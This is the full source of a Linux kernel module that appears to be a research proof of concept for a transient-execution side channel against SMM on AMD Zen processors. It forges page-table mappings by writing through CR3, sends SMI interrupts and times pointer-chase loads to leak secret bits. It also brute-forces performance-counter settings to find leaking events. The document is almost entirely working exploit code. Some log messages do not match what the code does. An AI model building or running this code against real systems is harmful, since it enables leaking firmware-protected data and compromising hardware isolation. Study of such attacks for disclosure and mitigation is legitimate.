/*
 * smm.c
 *
 *   SMM extraction kernel module with manual page table manipulation.
 * - Executes in Ring-0, pinned to Core 0.
 * - Uses direct CR3 page-table manipulation to forge virtual-to-physical mappings.
 * - Uses an SMI-triggered timing probe.
 * - Sweeps PMC umasks for the selected event.
 * - A-B-B-A Swapped execution order to prevent pipeline warm-up bias.
 * - Min-Floor evaluation.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sort.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/errno.h>
#include <linux/sched.h>
#include <linux/irqflags.h>
#include <asm/processor.h>
#include <asm/pgtable.h>
#include <asm/page.h>
#include <asm/io.h>
#include <asm/fpu/api.h>
#include <asm/msr.h>
#include <asm/apic.h>
#include <linux/nmi.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("TSA Researcher");
MODULE_DESCRIPTION("SMM timing extraction test module");

/* ------------------------------------------------------------------ */
/* Zen Performance Counter Configuration                              */
/* ------------------------------------------------------------------ */
#define MSR_ZEN4_PERF_CTL0 0xC0010206
#define MSR_ZEN4_PERF_CTR0 0xC0010207

#define MAX_UMASK_ID 0xFF
#define SELECTED_EVENT 0x76

/* ------------------------------------------------------------------ */
/* Configuration (Fill in your target VAs here)                       */
/* ------------------------------------------------------------------ */
#define PHYS_RESERVED_BASE 0x300000000ULL
#ifdef TSA_4LEVEL_PAGING
#define BASE_VA      0xffff000000000000ull
#else
#define BASE_VA      0xFF00000000000000ull
#endif

#define VICTIM_VA    (BASE_VA + 0x000072219B600000ULL)
#define CHASE_VA     (BASE_VA + 0x0000700000002000ULL)


#define MAP_SIZE           4096
static u64 secret_value = U64_MAX;
static u64 zero_bit, one_bit;

#define N_SECRET_BITS      32

#define SWEEP_PROBES       5
#define EXTRACTION_CNT     5

#define RUN_ON_THREAD 1

/* FF00h SMBASE Doubleword Read/Write */
#define OFFSET 0xF00

/* ------------------------------------------------------------------ */
/* User-Provided Page Table Manipulation Snippet                      */
/* ------------------------------------------------------------------ */
#define PAGE_PRESENT 0x1
#define PAGE_RW 0x2

static inline unsigned long read_cr3(void) {
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    return cr3;
}

static inline uint64_t canonicalize_48(uint64_t va)
{
    va &= 0x0000ffffffffffffULL;

    if (va & (1ULL << 47))
        va |= 0xffff000000000000ULL;

    return va;
}

static inline unsigned long smm_manual_va(unsigned long virt_addr)
{
#ifdef TSA_4LEVEL_PAGING
    return canonicalize_48(virt_addr);
#else
    return virt_addr;
#endif
}

static int map_physical_to_virtual(unsigned long phys_addr, unsigned long virt_addr,
                                   u64 additional_pte_flags) {
#ifdef TSA_4LEVEL_PAGING
    unsigned long *pml4, *pdp, *pd, *pt;
    unsigned long index4, index3, index2, index1;

    pml4 = (unsigned long *)__va(read_cr3() & ~0xFFFull);

    index4 = (virt_addr >> 39) & 0x1FF;
    index3 = (virt_addr >> 30) & 0x1FF;
    index2 = (virt_addr >> 21) & 0x1FF;
    index1 = (virt_addr >> 12) & 0x1FF;

    if (!(pml4[index4] & PAGE_PRESENT)) {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return -ENOMEM;

        pml4[index4] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }
    pdp = (unsigned long *)__va(pml4[index4] & PAGE_MASK);
    if (!(pdp[index3] & PAGE_PRESENT)) {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return -ENOMEM;

        pdp[index3] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }
    pd = (unsigned long *)__va(pdp[index3] & PAGE_MASK);
    if (!(pd[index2] & PAGE_PRESENT)) {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return -ENOMEM;

        pd[index2] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }
    pt = (unsigned long *)__va(pd[index2] & PAGE_MASK);
    pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | additional_pte_flags;

    asm volatile("sfence" ::: "memory");
    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");

    return 0;
#else
    unsigned long *pml5, *pml4, *pdp, *pd, *pt;
    unsigned long index5, index4, index3, index2, index1;
    
    pml5 = (unsigned long *)__va(read_cr3() & ~0xFFFull);
    
    index5 = (virt_addr >> 48) & 0x1FF;
    index4 = (virt_addr >> 39) & 0x1FF;
    index3 = (virt_addr >> 30) & 0x1FF;
    index2 = (virt_addr >> 21) & 0x1FF;
    index1 = (virt_addr >> 12) & 0x1FF;

    if (!(pml5[index5] & PAGE_PRESENT)) {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return -ENOMEM;

        pml5[index5] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }
    pml4 = (unsigned long *)__va(pml5[index5] & PAGE_MASK);
    if (!(pml4[index4] & PAGE_PRESENT)) {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return -ENOMEM;

        pml4[index4] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }
    pdp = (unsigned long *)__va(pml4[index4] & PAGE_MASK);
    if (!(pdp[index3] & PAGE_PRESENT)) {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return -ENOMEM;

        pdp[index3] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }
    pd = (unsigned long *)__va(pdp[index3] & PAGE_MASK);
    if (!(pd[index2] & PAGE_PRESENT)) {
        unsigned long page = __get_free_page(GFP_KERNEL | __GFP_ZERO);
        if (!page)
            return -ENOMEM;

        pd[index2] = __pa(page) | PAGE_PRESENT | PAGE_RW;
    }
    pt = (unsigned long *)__va(pd[index2] & PAGE_MASK);
    pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | additional_pte_flags;

    asm volatile("sfence" ::: "memory");

    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");

    return 0;
#endif
}

/* ------------------------------------------------------------------ */
/* Low-level CPU primitives                                           */
/* ------------------------------------------------------------------ */
static inline void mfence_lfence(void) {
    __asm__ volatile("mfence\nlfence" : : : "memory");
}

/* ------------------------------------------------------------------ */
/* SMI timing probe                                                   */
/* ------------------------------------------------------------------ */
static noinline __aligned(4096) uint64_t probe_D1(volatile uint8_t *victim, 
                         volatile uint8_t *target, 
                         uint64_t bit_idx,
                         volatile uint64_t *chase_head) 
{
    uint64_t elapsed;
    unsigned long flags;
    
    local_irq_save(flags);

    asm volatile("movq (%0),%%rax"::"r"(target):"rax","memory");    
    asm volatile("invlpg (%0)" :: "r"(target) : "memory");
    asm volatile("sfence" ::: "memory");
    
    apic->send_IPI(RUN_ON_THREAD, APIC_DM_SMI);
    
    mfence_lfence();
    asm volatile(
        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax, %%r8\n\t"
        "movq %%rdx, %%r11\n\t"

        "movb %b[bit], %%cl\n\t"
        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        ".rept 20\n\t"
        "movq %%r10, %%rsi\n\t"
        "addq %%r9, %%rsi\n\t"
        "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010201, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32, %%r11\n\t"
        "orq %%r11, %%r8\n\t"

        "shlq $32, %%rdx\n\t"
        "orq %%rdx, %%rax\n\t"
        "subq %%r8, %%rax\n\t"
        : "=&a"(elapsed)
        : [tgt] "r"(target),
          [bit] "r"(bit_idx),
          [chase] "r"(chase_head)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11", "r12", "r13",
          "memory");
        
    local_irq_restore(flags);
    return elapsed;
}

#define PROBE_FUNC probe_D1

/* ------------------------------------------------------------------ */
/* Kernel Filter Engine with Min Tracking                             */
/* ------------------------------------------------------------------ */
typedef struct {
    uint64_t min;
} filter_res_t;

typedef struct {
    uint64_t min0;
    uint64_t min1;
    uint64_t threshold_min;
} calib_t;

static int cmp_u64(const void *a, const void *b) {
    uint64_t va = *(const uint64_t *)a;
    uint64_t vb = *(const uint64_t *)b;

    if (va > vb) return 1;
    if (va < vb) return -1;
    return 0;
}

static filter_res_t filter_array_min_val(uint64_t *times, int count) {
    filter_res_t res = {0};

    sort(times, count, sizeof(uint64_t), cmp_u64, NULL);
    res.min = times[0];
    return res;
}


/* ------------------------------------------------------------------ */
/* Sweep Logic & Calibration                                          */
/* ------------------------------------------------------------------ */
static void fast_measure_interleaved_swapped(volatile uint8_t *victim, volatile uint8_t *target, 
                                             volatile uint64_t *chase, uint64_t *times0, uint64_t *times1,
                                             filter_res_t *res0, filter_res_t *res1) 
{
    int i;
    for (i = 0; i < SWEEP_PROBES; i += 2) {
        times0[i] = PROBE_FUNC(victim, target, zero_bit, chase);
        times1[i] = PROBE_FUNC(victim, target, one_bit, chase);
        
        if (i + 1 < SWEEP_PROBES) {
            times1[i+1] = PROBE_FUNC(victim, target, one_bit, chase);
            
            times0[i+1] = PROBE_FUNC(victim, target, zero_bit, chase);
        }
    }

    *res0 = filter_array_min_val(times0, SWEEP_PROBES);
    *res1 = filter_array_min_val(times1, SWEEP_PROBES);
}

static calib_t run_test_case(volatile uint8_t *victim, volatile uint8_t *target, 
                             volatile uint64_t *chase, uint64_t *times0, uint64_t *times1) 
{
    calib_t cal = {0};
    filter_res_t res0, res1;

    if (!times0 || !times1) {
        pr_err("vmalloc failed\n");
        return cal;
    }
    
    fast_measure_interleaved_swapped(victim, target, chase, times0, times1, &res0, &res1);

    cal.min0 = res0.min;
    cal.min1 = res1.min;
    cal.threshold_min = (cal.min0 + cal.min1) / 2;
    
    return cal;
}

/* ------------------------------------------------------------------ */
/* Extraction Logic                                                   */
/* ------------------------------------------------------------------ */
static filter_res_t measure_single_bit_stats(volatile uint8_t *victim, volatile uint8_t *target, 
                                             uint64_t bit_idx, volatile uint64_t *chase, uint64_t *times) 
{
    int i;
    filter_res_t res = {0};

    for (i = 0; i < EXTRACTION_CNT; i++) {
        times[i] = PROBE_FUNC(victim, target, bit_idx, chase);
    }

    res = filter_array_min_val(times, EXTRACTION_CNT);
    return res;
}

static int run_extraction(volatile uint8_t *victim, volatile uint8_t *target, 
                          volatile uint64_t *chase, const calib_t *cal, uint64_t *times) 
{
    uint64_t secret = (uint64_t)secret_value;
    int b, correct = 0;

    for (b = 0; b < N_SECRET_BITS; b++) {
        int true_bit = (secret >> b) & 1;
        int pred_bit;
        filter_res_t res = measure_single_bit_stats(victim, target, b, chase, times);

        if (cal->min0 < cal->min1) {
            pred_bit = (res.min > cal->threshold_min) ? 1 : 0;
        } else {
            pred_bit = (res.min > cal->threshold_min) ? 0 : 1;
        }

        if (pred_bit == true_bit) correct++;
    }
    
    return correct;
}

#define SMM_BASE_MSR 0xC0010111

/* ------------------------------------------------------------------ */
/* Main Kernel Thread Wrapper                                         */
/* ------------------------------------------------------------------ */
static struct task_struct *tsa_thread;

static int kthread_tsa_main(void *data) {

    u64 smm_base_val;
    uint64_t *times0, *times1;
    u64 found_pmcs = 0;
    u64 diff_pmc_test = 0;
    unsigned long victim_va = smm_manual_va(VICTIM_VA);
    unsigned long chase_va = smm_manual_va(CHASE_VA);
    unsigned long attack_va;
    int ret;

    (void)data;

    rdmsrl(SMM_BASE_MSR, smm_base_val);
    secret_value = (uint64_t)smm_base_val;

    for (int i = 0; i < N_SECRET_BITS; i++) {
        if ((secret_value >> i) & 1) {
            one_bit = i;
            break;
        }
    }

    for (int i = 0; i < N_SECRET_BITS; i++) {
        if (!((secret_value >> i) & 1)) {
            zero_bit = i;
            break;
        }
    }

    smm_base_val += 0xF000ull;
    pr_info("[+] Original SMM Base: 0x%llx | Adjusted SMM Base for Test: 0x%llx\n",
            smm_base_val - 0xF000ull, smm_base_val);

    attack_va = smm_manual_va(smm_base_val);

    volatile uint8_t *victim = (volatile uint8_t *)victim_va;
    volatile uint8_t *attack = (volatile uint8_t *)attack_va;
    volatile uint8_t *chase_region = (volatile uint8_t *)chase_va;
    volatile uint64_t *chase1, *chase2;
    int evt, umask, correct;
    calib_t attack_cal;

    if (OFFSET > (0x1000-0x8) || (OFFSET % 8) != 0) {
        pr_err("Invalid OFFSET value. Must be 0x8 aligned and below 0x1000 - 0x8.\n");
        return -1;
    }

    pr_info("============================================================\n");
    pr_info("  TSA-L1 Kernel Extractor: BRUTE FORCE PMC SWEEP\n");
    pr_info("============================================================\n");

    pr_info("[+] Mapping Virtual Addresses to Physical Base: 0x%llx\n", PHYS_RESERVED_BASE);
    pr_info("[+] Manual VAs victim=0x%lx attack=0x%lx chase=0x%lx\n",
            victim_va, attack_va, chase_va);
    
    ret = map_physical_to_virtual(PHYS_RESERVED_BASE, victim_va, 0);
    if (ret)
        goto map_failed;

    ret = map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, attack_va, 0);
    if (ret)
        goto map_failed;

    ret = map_physical_to_virtual(PHYS_RESERVED_BASE + 0x800000, chase_va, 0);
    if (ret)
        goto map_failed;

    ret = map_physical_to_virtual(PHYS_RESERVED_BASE + 0x801000, chase_va + MAP_SIZE, 0);
    if (ret)
        goto map_failed;

    memset((void *)attack, 0xFF, MAP_SIZE);

    attack = attack + OFFSET;
    victim = victim + OFFSET;

    chase1 = (uint64_t *)chase_region;
    chase2 = (uint64_t *)(chase_region + MAP_SIZE);
    *chase1 = (uint64_t)chase2;
    *chase2 = (uint64_t)chase1;
    
    times0 = vmalloc(SWEEP_PROBES * sizeof(uint64_t));
    times1 = vmalloc(SWEEP_PROBES * sizeof(uint64_t));
    if (!times0 || !times1) {
        pr_err("[-] Vmalloc failed. Aborting.\n");
        if (times0) vfree(times0);
        if (times1) vfree(times1);
        return -1;
    }

    pr_info("\n[+] COMMENCING BRUTE FORCE ITERATION (Events 0x00-0xFF, Umasks 0x00-0xFF)\n");
    pr_info("    Target Accuracy: > 28 / 32 bits\n");
    pr_info("    --------------------------------------------------------------\n");
    
    for (evt = SELECTED_EVENT; evt <= SELECTED_EVENT && !kthread_should_stop(); evt++) {
        pr_info("[*] Sweeping Event Base 0x%02X...\n", evt);

        for (umask = 0x00; umask <= MAX_UMASK_ID && !kthread_should_stop(); umask++) {
            uint64_t config = (1ULL << 22) | (1ULL << 17) | (1ULL << 16) |
                              ((uint64_t)umask << 8) | ((uint64_t)evt & 0xFF) |
                              (((uint64_t)evt >> 8) << 32);
                        
            wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
            wrmsrl(MSR_ZEN4_PERF_CTR0, 0ULL);
            wrmsrl(MSR_ZEN4_PERF_CTL0, config);

            attack_cal = run_test_case(victim, attack, chase1, times0, times1);
            if (attack_cal.min0 != attack_cal.min1) {
                diff_pmc_test++;
                correct = run_extraction(0, attack, chase1, &attack_cal, times0);
                
                if (correct > 28) {
                    pr_info("[+] VALID PMC FOUND: [E: 0x%03X | U: 0x%02X] -> Accuracy: %d / 32 bits\n", evt, umask, correct);
                    pr_info("Zero %llu vs One %llu\n",
                            (unsigned long long)attack_cal.min0,
                            (unsigned long long)attack_cal.min1);
                    found_pmcs++;
                }
            }
            cond_resched();

        }
        
        cond_resched(); 
    }

    vfree(times0);
    vfree(times1);

    wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
    pr_info("\n[+] PMC Brute Force Sweep Complete.\n");
    pr_info("[+] Total Valid PMCs Found: %llu\n", (unsigned long long)found_pmcs);
    pr_info("[+] Total Different PMCs found during test: %llu\n",
            (unsigned long long)diff_pmc_test);
    return 0;

map_failed:
    pr_err("[-] Manual page-table mapping failed: %d\n", ret);
    return ret;
}

static int __init tsa_init(void) {
    pr_info("TSA-L1 Module Loaded.\n");
    
    tsa_thread = kthread_create(kthread_tsa_main, NULL, "tsa_worker");
    if (IS_ERR(tsa_thread)) {
        pr_err("Failed to create kthread.\n");
        return PTR_ERR(tsa_thread);
    }
    
    kthread_bind(tsa_thread, RUN_ON_THREAD);
    wake_up_process(tsa_thread);
    
    return 0;
}

static void __exit tsa_exit(void) {
    pr_info("TSA-L1 Module Unloaded.\n");
}

module_init(tsa_init);
module_exit(tsa_exit);
